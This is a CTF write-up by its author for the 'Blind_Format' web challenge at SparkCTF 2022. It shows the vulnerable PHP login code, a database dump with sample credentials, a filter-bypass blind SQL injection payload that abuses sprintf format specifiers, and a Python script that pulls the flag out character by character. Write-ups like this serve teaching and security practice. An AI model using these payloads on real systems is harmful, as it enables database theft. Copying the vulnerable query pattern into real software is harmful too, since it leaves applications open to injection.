
---
title: SparkCTF 2022 - Official Writeup For Blind_Format 
# Summary for listings and search engines
summary: Medium Web Challenge Writeup 

# Date published
date: "2022-12-16T00:00:00+01:00"

authors:
- Wassila Chtioui

tags:
- Blind SQLi
- Web Exploitation
- CTF Write-up
- Format String Attack

categories:
- Web
- CTF
- SQLi
---

### Introduction
On the 9th of December, Engineers Spark Community held the SparkCTF 2022. It was a 12-hour local CTF in Tunisia, where 16 teams participated. It was incredible to get back to onsite CTFs after a long time due to the Corona pandemic.
Now, in this article, I will explain the web challenge that I wrote, which is Blind_Format.
### [Web] Blind_Format -  785 Points - 3 Solves 
_The flag is in the database, can you get it ? 
You may find the source code Here !_


![alt text](https://i.imgur.com/Tp8a8oF.png)

-------------------------------

Bumping into a login form, we try to trigger an SQLi but not a chance (Filter, is that you 💭 ?) so we dive into the source code.

#### Read the source code

When reading the source code, I usually start by looking where is the flag, this way I can figure out part of my payload and it helps me better understand the challenge.

In this task, looking at the bdump.sql file, we can see that the flag is in a table named Flag. So basically, we\'ll be extracting this flag character by character.

**▶️ [Blind SQLi](https://portswigger.net/web-security/sql-injection/blind) it is !**


```
-- MariaDB dump 10.19  Distrib 10.5.12-MariaDB, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: Task2
-- ------------------------------------------------------
-- Server version	10.5.12-MariaDB-1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Current Database: `Task2`
--

CREATE DATABASE /*!32312 IF NOT EXISTS*/ `Task2` /*!40100 DEFAULT CHARACTER SET utf8mb4 */;

USE `Task2`;

--
-- Table structure for table `Flag`
--

DROP TABLE IF EXISTS `Flag`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `Flag` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `flag` varchar(100) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `Flag`
--

LOCK TABLES `Flag` WRITE;
/*!40000 ALTER TABLE `Flag` DISABLE KEYS */;
INSERT INTO `Flag` VALUES (1,'Flag{[REDACTED]}');
/*!40000 ALTER TABLE `Flag` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `adminlogin`
--

DROP TABLE IF EXISTS `adminlogin`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `adminlogin` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(100) NOT NULL,
  `password` varchar(100) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `adminlogin`
--

LOCK TABLES `adminlogin` WRITE;
/*!40000 ALTER TABLE `adminlogin` DISABLE KEYS */;
INSERT INTO `adminlogin` VALUES (1,'uXUser11','uXUseR111101#?'),(2,'uXUser2','UuserX%1369#??'),(3,'Admin','PasSworD111101#?');
/*!40000 ALTER TABLE `adminlogin` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2022-08-18 10:59:02
```

Next, we can proceed in reading the *index.php* file. As we said earlier, we notice the exitence of filters. This is what we\'ll be looking for exactly. Reading the validate function, we can check what are these filters one by one.  

```
<?php

ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL);
session_start(); 

require_once('./connection.php');
if (isset($_POST['username']) && isset($_POST['password'])) {

function validate($data){

$filter = array ('/o(r|o)/i','/select/i','/a(n|d|a)/i');
$data= preg_replace($filter, "", $data);
$data = addslashes($data);

return $data;

}

```

#### First Filter
Let\'s begin with the first one. Basically here the preg_replace() function checks for a certain pattern and strips it. Since this is not a recursive check, we can inject *\"SESELECTLECT\"* in order to bypass the validation. But, this is not the case for the other two. The trick for the other ones is to use ||/&& instead of OR/AND .

#### Second Filter
The fun part starts here, so buckle up my friend ❗❗ . 
We can see the **addslahes** function. What it does is that it basically takes one of the following:
- '
- "
- \
- Null

And adds a backslash (\) before it preventing us, as a consequence, from escapting the query.

At this point, we keep reading the source code, to bump into something juicy. 

```
$uname = validate($_POST['username']);
$pass = validate($_POST['password']);

$sql = sprintf("SELECT * FROM adminlogin WHERE username='$uname' AND password='%s'", $pass);

$result = mysqli_query($conn, $sql);
if (mysqli_num_rows($result) >= 1) {
	header("Location: home.php");
	exit();
	$row = mysqli_fetch_assoc($result);
	$_SESSION['username'] = $row['username'];
	$_SESSION['id'] = $row['id']
}
else{
	header("Location: index.php?error=Incorect User name or password");
	exit();
	}
```

We notice in the above code that the query is being passed to a [sprintf](https://www.php.net/manual/fr/function.sprintf.php) function while taking the user input password as argument.

---
**sprintf** is a format string function vulnerable to Format String Attack.
For more details about this attack you may consult this article: *https://medium.com/swlh/binary-exploitation-format-string-vulnerabilities-70edd501c5be*

---

Injecting a format specifier in the username parameter can have us bypass the addslashes() function. How so 💭 ?

Looking at the sprintf documentation given in the link above, we can see that one of the flags comes in handy for us. 
Let's understand the format specfier little by little.
So a format specifier should be composed as follows:  **%[argnum$][flags][width][.precision]**
We will focus on *argnum* and *flags*. 
__argnum:__ specifies the argument number which in our case is 1 (only $pass is being passed as an argument).
__flags:__ The flag (\') is quite useful in our case since it pads the characters after it to the result.

So what happens is that basically, we can evade the query thanks to the sprintf function which will interprete the backslash + single quote as single quote bypassing as a result the validate method.

Getting to understand the structure of our payload, here's what it actually looks like:
`` ee %1$' || SUBSTRING((SESELECTLECT flag FROM Flag) , 1, 1) = %1$'F%1$' -- - `` 

This payload will get us redirected to an another page. We\'ll take advantage of this condition when writing our script.

![alt text](https://imgur.com/CnNlyJC.png)



Here\'s the script I used: 
```
import requests

x=33

url ="http://134.209.83.242:1234/"
p = 1
result = ""

while True:
        payload = "ee %1$' || ASCII(substring((SESELECTLECT flag from Flag)," + str(p) + ",1)) = %1$'"+ str(x) +"%1$' -- -"
        data = {'username' :  payload  , 'password' : 'aaa' }
       print (data)
        r = requests.post(url=url, data=data)
        if ("Welcome," in r.text):
                p = p + 1
                result = result + chr(x)
                x=33
                print (result)
        x=x+1
        if (x==126):
                break

```


And here we go ! That\'s how we get our Flag.

#### 🚩 Flag{Bl1Nd_SQLi_1S_7h3_B2sT} 🚩



### Conclusion
Finally, I want to thank everyone who contributed to the success of this event, including the organizers, the authors, and the participants who sticked till the end of the CTF. It was amazing, and I can't wait until the next CTF. 
